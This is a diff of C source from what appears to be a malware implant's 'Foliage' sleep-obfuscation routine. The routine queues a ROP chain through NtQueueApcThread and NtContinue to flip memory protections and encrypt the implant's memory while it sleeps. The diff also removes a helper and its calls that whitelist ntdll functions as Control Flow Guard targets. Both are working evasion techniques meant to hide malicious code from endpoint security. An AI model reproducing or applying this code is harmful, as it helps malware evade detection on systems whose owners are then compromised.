@@ -16,7 +16,7 @@ typedef struct
     DWORD	Length;
     DWORD	MaximumLength;
     PVOID	Buffer;
-} USTRING ;
+} USTRING;
 
 typedef struct _SLEEP_PARAM
 {
@@ -26,21 +26,6 @@ typedef struct _SLEEP_PARAM
 } SLEEP_PARAM, *PSLEEP_PARAM ;
 
 __asm__( "___chkstk_ms: ret\n" );
-
-VOID WINAPI CfgAddressAdd( LPVOID ImageBase, LPVOID Function )
-{
-    CFG_CALL_TARGET_INFO Cfg = { 0 };
-    SIZE_T			     Len = { 0 };
-    PIMAGE_NT_HEADERS    Nth = NULL;
-
-    Nth = RVA( PIMAGE_DOS_HEADER, ImageBase, ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
-    Len = ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 );
-
-    Cfg.Flags  = CFG_CALL_TARGET_VALID;
-    Cfg.Offset = Function - ImageBase;
-
-    Instance.Win32.SetProcessValidCallTargets( NtCurrentProcess(), ImageBase, Len, 1, &Cfg );
-}
 
 // Foliage Sleep obfuscation
 VOID FoliageObf( PSLEEP_PARAM Param )
@@ -225,7 +210,6 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
                     // RtlExitUserThread( ERROR_SUCCESS );
 
-                    // queue
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopBegin,    FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
@@ -236,14 +220,6 @@ VOID FoliageObf( PSLEEP_PARAM Param )
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
                     if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( hThread, Instance.Syscall.NtContinue, RopExitThd,  FALSE, NULL ) ) ) goto Leave;
-
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtContinue );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtTestAlert );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtSetContextThread );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtGetContextThread );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.RtlExitUserThread );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtWaitForSingleObject );
-                    CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtProtectVirtualMemory );
 
                     if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( hThread, NULL ) ) )
                     {
